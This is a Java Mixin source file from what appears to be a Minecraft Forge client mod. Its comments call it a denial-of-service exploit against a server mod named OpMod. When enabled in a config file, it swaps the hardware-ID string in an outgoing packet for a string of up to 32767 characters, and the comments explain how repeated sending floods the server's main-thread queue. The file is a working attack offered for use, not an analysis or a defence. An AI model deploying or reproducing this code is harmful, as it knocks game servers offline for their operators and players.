package fku.org.example.fku.mixin; /* water */

import fku.org.example.fku.config.OpmodDosConfig;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Pseudo;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

/**
 * OpMod DoS 利用（超长 hwid 攻击）。
 *
 * 当 opmod_dos.json 中 hwidAttack 开启时，把发给服务端的 hwid 字符串替换为超长字符串
 * （默认 32767 字节，即 Forge readUtf 的默认上限）。服务端每收到一个这样的包都会：
 *   1) decode 阶段按 readUtf 上限分配大字符串；
 *   2) handle 阶段 enqueueWork 入主线程队列，再 isHwidBanned 查 Set.contains + 覆盖写；
 * 高频发送即可造成主线程队列堆积 → DoS。
 *
 * 默认关闭，手动改 opmod_dos.json 才生效。
 * 使用字符串 target + remap=false + @Pseudo：编译期不依赖 opmod，仅运行期在 opmod 存在时织入。
 */
@Pseudo
@Mixin(targets = "lbxrman.mymod.opmod.network.PacketSendHwid", remap = false)
public abstract class MixinPacketSendHwid {

    @Shadow
    private String hwid;

    @Inject(method = "<init>(Ljava/lang/String;)V", at = @At("RETURN"), remap = false)
    private void onInit(String originalHwid, CallbackInfo ci) {
        try {
            OpmodDosConfig cfg = OpmodDosConfig.getInstance();
            if (cfg == null || !cfg.hwidAttack) return;

            int len = Math.max(1, Math.min(cfg.hwidLen, 32767));
            StringBuilder sb = new StringBuilder(len);
            for (int i = 0; i < len; i++) {
                sb.append((char) ('A' + (i % 26)));
            }
            this.hwid = sb.toString();
        } catch (Throwable t) {
            // 不阻断正常流程
        }
    }
}
